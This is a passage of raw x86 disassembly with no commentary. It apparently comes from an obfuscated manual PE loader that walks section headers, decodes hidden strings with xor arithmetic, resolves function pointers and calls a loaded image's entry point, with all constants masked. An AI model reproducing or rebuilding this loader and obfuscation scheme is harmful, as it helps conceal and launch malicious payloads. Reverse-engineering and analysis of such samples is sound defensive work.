  425ed1:	mov    eax,DWORD PTR [ebp+0x18]
  425ed4:	mov    ecx,DWORD PTR [ebp-0x24]
  425ed7:	mov    edx,DWORD PTR [ebp-0x8]
  425eda:	add    eax,0x28
  425edd:	xor    ecx,esi
  425edf:	lea    ecx,[edx+ecx*1+0x3272ec]
  425ee6:	mov    edx,DWORD PTR [ebp+0xc]
  425ee9:	mov    DWORD PTR [ebp+0x18],eax
  425eec:	mov    eax,DWORD PTR [ebp-0x24]
  425eef:	movzx  edx,WORD PTR [edx+0x6]
  425ef3:	xor    eax,esi
  425ef5:	sub    edx,eax
  425ef7:	mov    eax,DWORD PTR [ebp+0xc]
  425efa:	sub    edx,edi
  425efc:	mov    DWORD PTR [ebp-0x8],ecx
  425eff:	cmp    ecx,edx
  425f01:	jbe    0x425e87
  425f03:	mov    edx,DWORD PTR [ebx+0x18c]
  425f09:	mov    ecx,DWORD PTR [ebp+0x20]
  425f0c:	cmp    ecx,DWORD PTR [edx]
  425f0e:	jne    0x425f37
  425f10:	mov    eax,DWORD PTR [ebx+0x1d8]
  425f16:	lea    edx,[ebp-0x18]
  425f19:	push   edx
  425f1a:	mov    edx,DWORD PTR [ebp-0x10]
  425f1d:	xor    edx,esi
  425f1f:	add    edx,edi
  425f21:	push   edx
  425f22:	mov    edx,DWORD PTR [ebp-0x20]
  425f25:	push   DWORD PTR [edx+0x54]
  425f28:	push   ecx
  425f29:	call   DWORD PTR [eax+0x1c]
  425f2c:	test   eax,eax
  425f2e:	je     0x4261d7
  425f34:	mov    eax,DWORD PTR [ebp+0xc]
  425f37:	mov    ecx,DWORD PTR [ebx+0x1c8]
  425f3d:	mov    ecx,DWORD PTR [ecx]
  425f3f:	xor    ecx,esi
  425f41:	add    ecx,edi
  425f43:	je     0x426102
  425f49:	mov    eax,DWORD PTR [ebp-0x4]
  425f4c:	xor    eax,esi
  425f4e:	add    eax,edi
  425f50:	and    DWORD PTR [ebp+0x8],0x0
  425f54:	mov    DWORD PTR [ebp-0x14],eax
  425f57:	mov    ecx,0xf89c8524
  425f5c:	mov    eax,0xf89c85dc
  425f61:	mov    DWORD PTR [ebp-0x58],0xf89c8526
  425f68:	mov    DWORD PTR [ebp-0x54],0xf89c852c
  425f6f:	mov    DWORD PTR [ebp-0x50],eax
  425f72:	mov    DWORD PTR [ebp-0x4c],ecx
  425f75:	mov    DWORD PTR [ebp-0x48],ecx
  425f78:	mov    DWORD PTR [ebp-0x44],0xf89c85b0
  425f7f:	mov    edx,DWORD PTR [ebp+0x8]
  425f82:	mov    ecx,0x8a4
  425f87:	xor    cx,WORD PTR [ebp+edx*4-0x58]
  425f8c:	mov    edx,0x72ec
  425f91:	add    cx,dx
  425f94:	mov    edx,DWORD PTR [ebp+0x8]
  425f97:	inc    DWORD PTR [ebp+0x8]
  425f9a:	cmp    DWORD PTR [ebp+0x8],0x6
  425f9e:	mov    WORD PTR [ebp+edx*2-0xc0],cx
  425fa6:	jb     0x425f7f
  425fa8:	mov    ecx,0xf89c8522
  425fad:	mov    DWORD PTR [ebp-0xb0],eax
  425fb3:	mov    DWORD PTR [ebp-0x9c],eax
  425fb9:	mov    DWORD PTR [ebp-0x74],eax
  425fbc:	mov    DWORD PTR [ebp-0x70],eax
  425fbf:	lea    eax,[ecx+0x1]
  425fc2:	mov    edx,0xf89c85fe
  425fc7:	mov    DWORD PTR [ebp-0x64],eax
  425fca:	mov    DWORD PTR [ebp-0x60],eax
  425fcd:	mov    DWORD PTR [ebp-0xb4],0xf89c85c4
  425fd7:	mov    DWORD PTR [ebp-0xac],ecx
  425fdd:	mov    DWORD PTR [ebp-0xa8],edx
  425fe3:	mov    DWORD PTR [ebp-0xa4],0xf89c85d9
  425fed:	mov    DWORD PTR [ebp-0xa0],0xf89c8526
  425ff7:	mov    DWORD PTR [ebp-0x98],0xf89c85fd
  426001:	mov    DWORD PTR [ebp-0x94],0xf89c8526
  42600b:	mov    DWORD PTR [ebp-0x90],0xf89c852c
  426015:	mov    DWORD PTR [ebp-0x8c],ecx
  42601b:	mov    DWORD PTR [ebp-0x88],0xf89c8529
  426025:	mov    DWORD PTR [ebp-0x84],edx
  42602b:	mov    DWORD PTR [ebp-0x80],0xf89c8527
  426032:	mov    DWORD PTR [ebp-0x7c],ecx
  426035:	mov    DWORD PTR [ebp-0x78],0xf89c85f1
  42603c:	mov    DWORD PTR [ebp-0x6c],ecx
  42603f:	mov    DWORD PTR [ebp-0x68],0xf89c85dd
  426046:	mov    DWORD PTR [ebp-0x5c],0xf89c85b0
  42604d:	xor    eax,eax
  42604f:	mov    cl,BYTE PTR [ebp+eax*4-0xb4]
  426056:	xor    cl,0xa4
  426059:	sub    cl,0x14
  42605c:	mov    BYTE PTR [ebp+eax*1-0xd8],cl
  426063:	inc    eax
  426064:	cmp    eax,0x17
  426067:	jb     0x42604f
  426069:	mov    eax,DWORD PTR [ebx+0x1d8]
  42606f:	lea    ecx,[ebp-0xc0]
  426075:	push   ecx
  426076:	call   DWORD PTR [eax+0x4]
  426079:	mov    ecx,DWORD PTR [ebx+0x1d8]
  42607f:	lea    edx,[ebp-0xd8]
  426085:	push   edx
  426086:	push   eax
  426087:	call   DWORD PTR [ecx+0x8]
  42608a:	mov    DWORD PTR [ebp-0x40],eax
  42608d:	lea    eax,[ebp-0x14]
  426090:	push   eax
  426091:	mov    eax,DWORD PTR [ebx+0x18c]
  426097:	push   DWORD PTR [eax]
  426099:	mov    eax,DWORD PTR [ebp-0x40]
  42609c:	call   eax
  42609e:	mov    eax,DWORD PTR [ebp-0x4]
  4260a1:	xor    eax,esi
  4260a3:	add    eax,edi
  4260a5:	mov    DWORD PTR [ebp-0x34],eax
  4260a8:	mov    ecx,DWORD PTR [ebp-0x4]
  4260ab:	mov    eax,DWORD PTR [ebp-0x14]
  4260ae:	xor    ecx,esi
  4260b0:	add    ecx,edi
  4260b2:	cmp    eax,ecx
  4260b4:	je     0x4260ff
  4260b6:	mov    DWORD PTR [ebp-0x3c],eax
  4260b9:	jmp    0x4260ca
  4260bb:	mov    eax,DWORD PTR [eax]
  4260bd:	mov    ecx,DWORD PTR [ebp-0x3c]
  4260c0:	mov    DWORD PTR [ebp-0x14],eax
  4260c3:	mov    eax,DWORD PTR [ebp-0x14]
  4260c6:	cmp    eax,ecx
  4260c8:	je     0x4260d7
  4260ca:	mov    edx,DWORD PTR [eax+0x18]
  4260cd:	mov    ecx,DWORD PTR [ebx+0x18c]
  4260d3:	cmp    edx,DWORD PTR [ecx]
  4260d5:	jne    0x4260bb
  4260d7:	mov    ecx,DWORD PTR [ebx+0x18c]
  4260dd:	mov    edx,DWORD PTR [eax+0x18]
  4260e0:	cmp    edx,DWORD PTR [ecx]
  4260e2:	jne    0x4260ff
  4260e4:	mov    ecx,DWORD PTR [ebx+0x190]
  4260ea:	mov    edx,DWORD PTR [ebp-0x20]
  4260ed:	mov    edx,DWORD PTR [edx+0x28]
  4260f0:	add    edx,DWORD PTR [ecx]
  4260f2:	mov    DWORD PTR [eax+0x1c],edx
  4260f5:	mov    eax,DWORD PTR [ebp-0x24]
  4260f8:	xor    eax,esi
  4260fa:	add    eax,edi
  4260fc:	mov    DWORD PTR [ebp-0x34],eax
  4260ff:	mov    eax,DWORD PTR [ebp+0xc]
  426102:	push   ebx
  426103:	push   eax
  426104:	push   DWORD PTR [ebp+0x20]
  426107:	call   0x425883
  42610c:	test   eax,eax
  42610e:	je     0x4261d7
  426114:	push   DWORD PTR [ebp+0xc]
  426117:	mov    ecx,ebx
  426119:	push   DWORD PTR [ebp+0x20]
  42611c:	call   0x4257dc
  426121:	test   eax,eax
  426123:	je     0x4261d7
  426129:	mov    eax,DWORD PTR [ebp+0xc]
  42612c:	mov    edx,DWORD PTR [ebp+0x20]
  42612f:	mov    ecx,ebx
  426131:	call   0x4256b5
  426136:	test   eax,eax
  426138:	je     0x4261d7
  42613e:	push   ebx
  42613f:	push   DWORD PTR [ebp+0x20]
  426142:	call   0x425b66
  426147:	test   eax,eax
  426149:	je     0x4261d7
  42614f:	mov    eax,DWORD PTR [ebx+0x18c]
  426155:	mov    edx,DWORD PTR [ebp+0x20]
  426158:	cmp    edx,DWORD PTR [eax]
  42615a:	jne    0x426176
  42615c:	mov    eax,DWORD PTR [ebx+0x1d8]
  426162:	lea    ecx,[ebp-0x18]
  426165:	push   ecx
  426166:	push   DWORD PTR [ebp-0x18]
  426169:	mov    ecx,DWORD PTR [ebp-0x20]
  42616c:	push   DWORD PTR [ecx+0x54]
  42616f:	push   edx
  426170:	call   DWORD PTR [eax+0x1c]
  426173:	mov    edx,DWORD PTR [ebp+0x20]
  426176:	mov    eax,DWORD PTR [ebx+0x1c8]
  42617c:	mov    eax,DWORD PTR [eax]
  42617e:	xor    eax,esi
  426180:	add    eax,edi
  426182:	je     0x4261bb
  426184:	mov    ecx,DWORD PTR [ebp+0xc]
  426187:	mov    eax,DWORD PTR [ecx+0x28]
  42618a:	mov    DWORD PTR [ebp+0x8],0xf89ca5b0
  426191:	mov    esi,DWORD PTR [ebp+0x8]
  426194:	push   DWORD PTR [ebp+0x14]
  426197:	xor    esi,0x8a4
  42619d:	push   DWORD PTR [ebp+0x10]
  4261a0:	add    esi,0x72ec
  4261a6:	or     WORD PTR [ecx+0x16],si
  4261aa:	add    eax,edx
  4261ac:	push   edx
  4261ad:	call   eax
  4261af:	mov    DWORD PTR [ebx+0x1d0],0xf89c85b1
  4261b9:	jmp    0x4261c5
  4261bb:	mov    eax,DWORD PTR [ebp+0xc]
  4261be:	mov    eax,DWORD PTR [eax+0x28]
  4261c1:	add    eax,edx
  4261c3:	call   eax
  4261c5:	mov    DWORD PTR [ebp-0x8],eax
  4261c8:	mov    eax,DWORD PTR [ebp-0x8]
  4261cb:	mov    ecx,DWORD PTR [ebp+0x1c]
  4261ce:	mov    DWORD PTR [ecx],eax
  4261d0:	mov    DWORD PTR [ebp-0x30],0x1
  4261d7:	cmp    DWORD PTR [ebp-0x30],0x0
  4261db:	jne    0x4261e1
  4261dd:	and    DWORD PTR [ebp+0x20],0x0
  4261e1:	mov    eax,DWORD PTR [ebp+0x20]
  4261e4:	jmp    0x4261e8
  4261e6:	xor    eax,eax
  4261e8:	pop    edi
  4261e9:	pop    esi
  4261ea:	pop    ebx
  4261eb:	leave  
  4261ec:	ret    0x1c
  4261ef:	push   ebp
  4261f0:	mov    ebp,esp
  4261f2:	movzx  edx,WORD PTR [ecx+0x6]
  4261f6:	movzx  eax,WORD PTR [ecx+0x14]
  4261fa:	push   ebx
  4261fb:	push   edi
  4261fc:	xor    edi,edi
  4261fe:	lea    eax,[eax+ecx*1+0x18]
  426202:	test   edx,edx
  426204:	je     0x426225
  426206:	mov    ecx,DWORD PTR [eax+0xc]
  426209:	lea    ebx,[ecx+esi*1]
  42620c:	cmp    DWORD PTR [ebp+0x8],ebx
  42620f:	jb     0x42621d
  426211:	mov    ebx,DWORD PTR [eax+0x8]
  426214:	add    ebx,ecx
  426216:	add    ebx,esi
  426218:	cmp    DWORD PTR [ebp+0x8],ebx
  42621b:	jb     0x426227
  42621d:	add    eax,0x28
  426220:	inc    edi
  426221:	cmp    edi,edx
  426223:	jb     0x426206
  426225:	xor    eax,eax
  426227:	pop    edi
  426228:	pop    ebx
  426229:	pop    ebp
  42622a:	ret    0x4
  42622d:	push   ebp
  42622e:	mov    ebp,esp
  426230:	sub    esp,0x34
  426233:	mov    DWORD PTR [ebp-0xc],0xf89c85b0
  42623a:	mov    DWORD PTR [ebp-0x18],0xf89c85b1
  426241:	mov    DWORD PTR [ebp-0x1c],0xf89c85b2
  426248:	mov    DWORD PTR [ebp-0x8],0xf89c85d1
  42624f:	mov    DWORD PTR [ebp-0x20],0xf89c85f1
  426256:	mov    DWORD PTR [ebp-0x2c],0xf89c852a
  42625d:	mov    DWORD PTR [ebp-0x2c],0xf89c85ca
  426264:	mov    DWORD PTR [ebp-0x10],eax
  426267:	mov    eax,DWORD PTR [ebp+0x8]
  42626a:	mov    DWORD PTR [ebp-0x14],eax
  42626d:	mov    eax,DWORD PTR [ebp-0xc]
  426270:	push   ebx
  426271:	mov    ecx,0x75108a4
  426276:	xor    eax,ecx
  426278:	push   esi
  426279:	mov    esi,DWORD PTR [ebp-0x10]
  42627c:	mov    edx,0x3272ec
  426281:	add    eax,edx
  426283:	push   edi
  426284:	cmp    esi,eax
  426286:	je     0x426465
  42628c:	mov    eax,DWORD PTR [ebp-0xc]
  42628f:	mov    esi,DWORD PTR [ebp-0x14]
  426292:	xor    eax,ecx
  426294:	add    eax,edx
  426296:	cmp    esi,eax
  426298:	je     0x426465
  42629e:	mov    eax,DWORD PTR [ebp-0xc]
  4262a1:	xor    eax,ecx
  4262a3:	add    eax,edx
  4262a5:	mov    DWORD PTR [ebp-0x24],eax
  4262a8:	mov    eax,DWORD PTR [ebp-0xc]
  4262ab:	xor    eax,ecx
  4262ad:	add    eax,edx
  4262af:	mov    DWORD PTR [ebp-0x28],eax
  4262b2:	mov    edi,DWORD PTR [ebp-0x20]
  4262b5:	mov    ebx,DWORD PTR [ebp-0x8]
  4262b8:	mov    esi,0x8a4
  4262bd:	xor    edi,esi
  4262bf:	mov    eax,0x72ec
  4262c4:	xor    ebx,esi
  4262c6:	add    edi,eax
  4262c8:	add    ebx,eax
  4262ca:	sub    ebx,edi
  4262cc:	mov    WORD PTR [ebp-0x8],bx
  4262d0:	jmp    0x426395
  4262d5:	mov    edi,DWORD PTR [ebp-0xc]
  4262d8:	mov    bx,WORD PTR [ebp-0x4]
  4262dc:	xor    edi,esi
  4262de:	add    edi,eax
  4262e0:	cmp    bx,di
  4262e3:	je     0x4263d7
  4262e9:	mov    edi,DWORD PTR [ebp-0xc]
  4262ec:	mov    ebx,DWORD PTR [ebp+0xc]
  4262ef:	xor    edi,ecx
  4262f1:	add    edi,edx
  4262f3:	cmp    ebx,edi
  4262f5:	mov    di,WORD PTR [ebp-0x4]
  4262f9:	mov    bx,WORD PTR [ebp+0x8]
  4262fd:	je     0x426368
  4262ff:	cmp    bx,di
  426302:	je     0x426371
  426304:	mov    edi,DWORD PTR [ebp-0x20]
  426307:	mov    bx,WORD PTR [ebp+0x8]
  42630b:	xor    edi,esi
  42630d:	add    edi,eax
  42630f:	cmp    bx,di
  426312:	jb     0x426332
  426314:	mov    edi,DWORD PTR [ebp-0x2c]
  426317:	mov    bx,WORD PTR [ebp+0x8]
  42631b:	xor    edi,esi
  42631d:	add    edi,eax
  42631f:	cmp    bx,di
  426322:	ja     0x426332
  426324:	movzx  edi,WORD PTR [ebp+0x8]
  426328:	movzx  ebx,WORD PTR [ebp-0x8]
  42632c:	add    edi,ebx
  42632e:	mov    WORD PTR [ebp+0x8],di
  426332:	mov    edi,DWORD PTR [ebp-0x20]
  426335:	mov    bx,WORD PTR [ebp-0x4]
  426339:	xor    edi,esi
  42633b:	add    edi,eax
  42633d:	cmp    bx,di
  426340:	jb     0x426360
  426342:	mov    edi,DWORD PTR [ebp-0x2c]
  426345:	mov    bx,WORD PTR [ebp-0x4]
  426349:	xor    edi,esi
  42634b:	add    edi,eax
  42634d:	cmp    bx,di
  426350:	ja     0x426360
  426352:	movzx  edi,WORD PTR [ebp-0x4]
  426356:	movzx  ebx,WORD PTR [ebp-0x8]
  42635a:	add    edi,ebx
  42635c:	mov    WORD PTR [ebp-0x4],di
  426360:	mov    di,WORD PTR [ebp-0x4]
  426364:	mov    bx,WORD PTR [ebp+0x8]
  426368:	cmp    bx,di
  42636b:	jne    0x426465
  426371:	mov    edi,DWORD PTR [ebp-0x1c]
  426374:	mov    ebx,DWORD PTR [ebp-0x10]
  426377:	xor    edi,ecx
  426379:	lea    edi,[edi+ebx*1+0x3272ec]
  426380:	mov    DWORD PTR [ebp-0x10],edi
  426383:	mov    edi,DWORD PTR [ebp-0x1c]
  426386:	mov    ebx,DWORD PTR [ebp-0x14]
  426389:	xor    edi,ecx
  42638b:	lea    edi,[edi+ebx*1+0x3272ec]
  426392:	mov    DWORD PTR [ebp-0x14],edi
  426395:	mov    edi,DWORD PTR [ebp-0x24]
  426398:	mov    ebx,DWORD PTR [ebp-0x10]
  42639b:	mov    di,WORD PTR [ebx+edi*2]
  42639f:	mov    WORD PTR [ebp+0x8],di
  4263a3:	mov    edi,DWORD PTR [ebp-0x28]
  4263a6:	mov    ebx,DWORD PTR [ebp-0x14]
  4263a9:	mov    di,WORD PTR [ebx+edi*2]
  4263ad:	mov    WORD PTR [ebp-0x4],di
  4263b1:	mov    edi,DWORD PTR [ebp-0xc]
  4263b4:	mov    bx,WORD PTR [ebp+0x8]
  4263b8:	xor    edi,esi
  4263ba:	add    edi,eax
  4263bc:	cmp    bx,di
  4263bf:	jne    0x4262d5
  4263c5:	mov    eax,DWORD PTR [ebp-0x18]
  4263c8:	mov    esi,DWORD PTR [ebp-0xc]
  4263cb:	xor    eax,ecx
  4263cd:	add    eax,edx
  4263cf:	imul   eax,esi
  4263d2:	mov    DWORD PTR [ebp-0xc],eax
  4263d5:	jmp    0x4263e9
  4263d7:	mov    eax,DWORD PTR [ebp-0xc]
  4263da:	mov    esi,DWORD PTR [ebp-0x18]
  4263dd:	xor    eax,ecx
  4263df:	lea    eax,[eax+esi*1+0x3272ec]
  4263e6:	mov    DWORD PTR [ebp-0x18],eax
  4263e9:	mov    eax,DWORD PTR [ebp-0x24]
  4263ec:	sub    eax,edx
  4263ee:	xor    eax,ecx
  4263f0:	mov    DWORD PTR [ebp-0x30],eax
  4263f3:	mov    eax,DWORD PTR [ebp-0x28]
  4263f6:	sub    eax,edx
  4263f8:	xor    eax,ecx
  4263fa:	mov    DWORD PTR [ebp-0x34],eax
  4263fd:	mov    eax,DWORD PTR [ebp-0x34]
  426400:	mov    esi,DWORD PTR [ebp-0x1c]
  426403:	xor    esi,ecx
  426405:	add    esi,edx
  426407:	xor    eax,ecx
  426409:	add    eax,0x3272ec
  42640e:	imul   esi,eax
  426411:	mov    eax,DWORD PTR [ebp-0x14]
  426414:	movzx  eax,WORD PTR [esi+eax*1]
  426418:	mov    esi,DWORD PTR [ebp-0x30]
  42641b:	mov    edi,DWORD PTR [ebp-0x1c]
  42641e:	xor    esi,ecx
  426420:	add    esi,edx
  426422:	xor    edi,ecx
  426424:	add    edi,edx
  426426:	imul   edi,esi
  426429:	mov    esi,DWORD PTR [ebp-0x10]
  42642c:	movzx  esi,WORD PTR [edi+esi*1]
  426430:	sub    eax,edx
  426432:	sub    esi,edx
  426434:	xor    eax,ecx
  426436:	xor    esi,ecx
  426438:	cmp    esi,eax
  42643a:	jne    0x426465
  42643c:	mov    eax,DWORD PTR [ebp-0x30]
  42643f:	mov    esi,DWORD PTR [ebp-0x1c]
  426442:	xor    eax,ecx
  426444:	add    eax,0x3272ec
  426449:	xor    esi,ecx
  42644b:	add    esi,edx
  42644d:	imul   esi,eax
  426450:	mov    eax,DWORD PTR [ebp-0x10]
  426453:	movzx  eax,WORD PTR [esi+eax*1]
  426457:	mov    esi,DWORD PTR [ebp-0xc]
  42645a:	sub    eax,edx
  42645c:	xor    eax,ecx
  42645e:	cmp    eax,esi
  426460:	mov    eax,DWORD PTR [ebp-0xc]
  426463:	je     0x426468
  426465:	mov    eax,DWORD PTR [ebp-0x18]
  426468:	pop    edi
  426469:	xor    eax,ecx
  42646b:	pop    esi
  42646c:	add    eax,edx
  42646e:	pop    ebx
  42646f:	leave  
  426470:	ret    0x8
  426473:	push   ebp
  426474:	mov    ebp,esp
  426476:	push   ecx
  426477:	mov    cx,WORD PTR [eax]
  42647a:	push   esi
  42647b:	mov    esi,0x3b56
  426480:	sub    cx,si
  426483:	mov    esi,0x8a94
  426488:	xor    cx,si
  42648b:	mov    esi,0x4e3e
  426490:	mov    DWORD PTR [ebp-0x4],0xf89c85b7
  426497:	mov    edx,0xf89c85b0
  42649c:	cmp    cx,si
  42649f:	je     0x4264fe
  4264a1:	push   ebx
  4264a2:	push   edi
  4264a3:	movzx  ecx,cx
  4264a6:	mov    edi,0xffcd8d14
  4264ab:	mov    esi,0x75108a4
  4264b0:	mov    ebx,0x4f92
  4264b5:	cmp    cx,bx
  4264b8:	jne    0x4264bd
  4264ba:	mov    DWORD PTR [ebp-0x4],edx
  4264bd:	lea    edx,[edi+0x1]
  4264c0:	xor    edx,esi
  4264c2:	mov    edi,edx
  4264c4:	xor    edi,esi
  4264c6:	mov    cx,WORD PTR [eax+edi*2+0x64e5d8]
  4264ce:	mov    ebx,0x3b56
  4264d3:	sub    cx,bx
  4264d6:	mov    ebx,0x8a94
  4264db:	xor    cx,bx
  4264de:	mov    ebx,0x4e3e
  4264e3:	cmp    cx,bx
  4264e6:	jne    0x4264b0
  4264e8:	mov    ecx,DWORD PTR [ebp-0x4]
  4264eb:	pop    edi
  4264ec:	pop    ebx
  4264ed:	cmp    ecx,0xf89c85b7
  4264f3:	je     0x4264fe
  4264f5:	xor    ecx,esi
  4264f7:	lea    eax,[eax+ecx*2+0x64e5da]
  4264fe:	pop    esi
  4264ff:	leave  
  426500:	ret    
  426501:	push   ebp
  426502:	mov    ebp,esp
  426504:	push   ecx
  426505:	push   esi
  426506:	push   edi
  426507:	mov    DWORD PTR [ebp-0x4],0xf89c85b7
  42650e:	mov    esi,0xf89c85b0
  426513:	call   0x426473
  426518:	mov    edi,eax
  42651a:	mov    al,BYTE PTR [edi]
  42651c:	add    al,0x3
  42651e:	xor    al,0x79
  426520:	cmp    al,0x7a
  426522:	je     0x426585
  426524:	mov    eax,edi
  426526:	mov    edx,0xffcd8d14
  42652b:	mov    ecx,0x75108a4
  426530:	push   ebx
  426531:	mov    ax,WORD PTR [eax]
  426534:	mov    ebx,0x3b56
  426539:	sub    ax,bx
  42653c:	mov    ebx,0x8a94
  426541:	xor    ax,bx
  426544:	mov    ebx,0x4e4c
  426549:	cmp    ax,bx
  42654c:	jne    0x426551
  42654e:	mov    DWORD PTR [ebp-0x4],esi
  426551:	lea    esi,[edx+0x1]
  426554:	xor    esi,ecx
  426556:	mov    edx,esi
  426558:	xor    edx,ecx
  42655a:	lea    eax,[edi+edx*2+0x64e5d8]
  426561:	mov    bl,BYTE PTR [eax]
  426563:	add    bl,0x3
  426566:	xor    bl,0x79
  426569:	cmp    bl,0x7a
  42656c:	jne    0x426531
  42656e:	mov    eax,DWORD PTR [ebp-0x4]
  426571:	pop    ebx
  426572:	cmp    eax,0xf89c85b7
  426577:	je     0x426585
  426579:	xor    eax,ecx
  42657b:	xor    ecx,ecx
  42657d:	mov    WORD PTR [edi+eax*2+0x64e5d8],cx
  426585:	mov    eax,edi
  426587:	pop    edi
  426588:	pop    esi
  426589:	leave  
  42658a:	ret    
  42658b:	push   ebp
  42658c:	mov    ebp,esp
  42658e:	push   ecx
  42658f:	push   esi
  426590:	mov    DWORD PTR [ebp-0x4],0xf89c85b7
  426597:	mov    esi,0xf89c85b0
  42659c:	call   0x426473
  4265a1:	mov    cx,WORD PTR [eax]
  4265a4:	mov    edx,0x3b56
  4265a9:	sub    cx,dx
  4265ac:	mov    edx,0x8a94
  4265b1:	xor    cx,dx
  4265b4:	mov    edx,0x4e3e
  4265b9:	cmp    cx,dx
  4265bc:	je     0x426615
  4265be:	push   ebx
  4265bf:	push   edi
  4265c0:	movzx  ecx,cx
  4265c3:	mov    edx,0xffcd8d14
  4265c8:	mov    edi,0x75108a4
  4265cd:	mov    ebx,0x4e4c
  4265d2:	cmp    cx,bx
  4265d5:	jne    0x4265da
  4265d7:	mov    DWORD PTR [ebp-0x4],esi
  4265da:	lea    esi,[edx+0x1]
  4265dd:	xor    esi,edi
  4265df:	mov    edx,esi
  4265e1:	xor    edx,edi
  4265e3:	mov    cx,WORD PTR [eax+edx*2+0x64e5d8]
  4265eb:	mov    ebx,0x3b56
  4265f0:	sub    cx,bx
  4265f3:	mov    ebx,0x8a94
  4265f8:	xor    cx,bx
  4265fb:	mov    ebx,0x4e3e
  426600:	cmp    cx,bx
  426603:	jne    0x4265cd
  426605:	cmp    DWORD PTR [ebp-0x4],0xf89c85b7
  42660c:	pop    edi
  42660d:	pop    ebx
  42660e:	je     0x426615
  426610:	xor    eax,eax
  426612:	inc    eax
  426613:	jmp    0x426617
  426615:	xor    eax,eax
  426617:	pop    esi
  426618:	leave  
  426619:	ret    
  42661a:	push   ebp
  42661b:	mov    ebp,esp
  42661d:	push   ecx
  42661e:	mov    eax,DWORD PTR [ebp+0x8]
  426621:	movzx  ecx,WORD PTR [eax]
  426624:	push   esi
  426625:	lea    eax,[ecx-0x3b56]
  42662b:	mov    esi,0x8a94
  426630:	push   edi
  426631:	xor    eax,esi
  426633:	mov    edi,0x4e3e
  426638:	mov    DWORD PTR [ebp-0x4],edx
  42663b:	cmp    ax,di
  42663e:	je     0x42666b
  426640:	mov    eax,DWORD PTR [ebp+0x8]
  426643:	sub    eax,edx
  426645:	mov    DWORD PTR [ebp+0x8],eax
  426648:	jmp    0x42664d
  42664a:	mov    eax,DWORD PTR [ebp+0x8]
  42664d:	mov    WORD PTR [edx],cx
  426650:	add    edx,0x2
  426653:	movzx  edi,WORD PTR [eax+edx*1]
  426657:	mov    ecx,edi
  426659:	add    edi,0xffffc4aa
  42665f:	xor    edi,esi
  426661:	mov    eax,0x4e3e
  426666:	cmp    di,ax
  426669:	jne    0x42664a
  42666b:	xor    eax,eax
  42666d:	pop    edi
  42666e:	mov    WORD PTR [edx],ax
  426671:	mov    eax,DWORD PTR [ebp-0x4]
  426674:	pop    esi
  426675:	leave  
  426676:	ret    0x4
  426679:	push   ebp
  42667a:	mov    ebp,esp
  42667c:	sub    esp,0x18
  42667f:	mov    DWORD PTR [ebp-0x8],0xf89c85b0
  426686:	mov    DWORD PTR [ebp-0x18],0xf89c85b1
  42668d:	mov    ecx,DWORD PTR [ebp-0x8]
  426690:	push   esi
  426691:	mov    eax,0x75108a4
  426696:	xor    ecx,eax
  426698:	mov    esi,0x3272ec
  42669d:	add    ecx,esi
  42669f:	mov    DWORD PTR [ebp-0x4],ecx
  4266a2:	mov    DWORD PTR [ebp-0xc],0xf89c85b8
  4266a9:	mov    DWORD PTR [ebp-0x10],0xf89c85bc
  4266b0:	push   edi
  4266b1:	mov    DWORD PTR [ebp-0x14],0xf89c85b2
  4266b8:	jmp    0x426759
  4266bd:	mov    ecx,DWORD PTR [ebp-0x4]
  4266c0:	mov    edx,DWORD PTR [ebp+0x10]
  4266c3:	sub    edx,ecx
  4266c5:	mov    ecx,DWORD PTR [ebp-0xc]
  4266c8:	xor    ecx,eax
  4266ca:	add    ecx,esi
  4266cc:	cmp    edx,ecx
  4266ce:	jbe    0x4266eb
  4266d0:	mov    edx,DWORD PTR [ebp-0x4]
  4266d3:	add    edx,DWORD PTR [ebp+0x8]
  4266d6:	mov    ecx,DWORD PTR [ebp-0x4]
  4266d9:	add    ecx,DWORD PTR [ebp+0xc]
  4266dc:	mov    edi,DWORD PTR [ecx]
  4266de:	mov    DWORD PTR [edx],edi
  4266e0:	mov    ecx,DWORD PTR [ecx+0x4]
  4266e3:	mov    DWORD PTR [edx+0x4],ecx
  4266e6:	mov    ecx,DWORD PTR [ebp-0xc]
  4266e9:	jmp    0x426738
  4266eb:	mov    ecx,DWORD PTR [ebp-0x4]
  4266ee:	mov    edx,DWORD PTR [ebp+0x10]
  4266f1:	sub    edx,ecx
  4266f3:	mov    ecx,DWORD PTR [ebp-0x10]
  4266f6:	xor    ecx,eax
  4266f8:	add    ecx,esi
  4266fa:	cmp    edx,ecx
  4266fc:	mov    ecx,DWORD PTR [ebp-0x4]
  4266ff:	jbe    0x426713
  426701:	add    ecx,DWORD PTR [ebp+0x8]
  426704:	mov    edx,DWORD PTR [ebp-0x4]
  426707:	add    edx,DWORD PTR [ebp+0xc]
  42670a:	mov    edx,DWORD PTR [edx]
  42670c:	mov    DWORD PTR [ecx],edx
  42670e:	mov    ecx,DWORD PTR [ebp-0x10]
  426711:	jmp    0x426738
  426713:	mov    edx,DWORD PTR [ebp+0x10]
  426716:	sub    edx,ecx
  426718:	mov    ecx,DWORD PTR [ebp-0x14]
  42671b:	xor    ecx,eax
  42671d:	add    ecx,esi
  42671f:	cmp    edx,ecx
  426721:	mov    ecx,DWORD PTR [ebp-0x4]
  426724:	jbe    0x426749
  426726:	add    ecx,DWORD PTR [ebp+0x8]
  426729:	mov    edx,DWORD PTR [ebp-0x4]
  42672c:	add    edx,DWORD PTR [ebp+0xc]
  42672f:	mov    dx,WORD PTR [edx]
  426732:	mov    WORD PTR [ecx],dx
  426735:	mov    ecx,DWORD PTR [ebp-0x14]
  426738:	mov    edx,DWORD PTR [ebp-0x4]
  42673b:	xor    ecx,eax
  42673d:	lea    ecx,[ecx+edx*1+0x3272ec]
  426744:	mov    DWORD PTR [ebp-0x4],ecx
  426747:	jmp    0x426759
  426749:	add    ecx,DWORD PTR [ebp+0x8]
  42674c:	mov    edx,DWORD PTR [ebp-0x4]
  42674f:	add    edx,DWORD PTR [ebp+0xc]
  426752:	mov    dl,BYTE PTR [edx]
  426754:	mov    BYTE PTR [ecx],dl
  426756:	inc    DWORD PTR [ebp-0x4]
  426759:	mov    ecx,DWORD PTR [ebp-0x18]
  42675c:	mov    edx,DWORD PTR [ebp+0x10]
  42675f:	xor    ecx,eax
  426761:	add    ecx,esi
  426763:	imul   ecx,edx
  426766:	mov    edx,DWORD PTR [ebp-0x8]
  426769:	mov    edi,DWORD PTR [ebp-0x4]
  42676c:	xor    edx,eax
  42676e:	lea    edx,[edx+edi*1+0x3272ec]
  426775:	cmp    edx,ecx
  426777:	jb     0x4266bd
  42677d:	pop    edi
  42677e:	pop    esi
  42677f:	leave  
  426780:	ret    0xc
  426783:	push   ebp
  426784:	mov    ebp,esp
  426786:	sub    esp,0xc
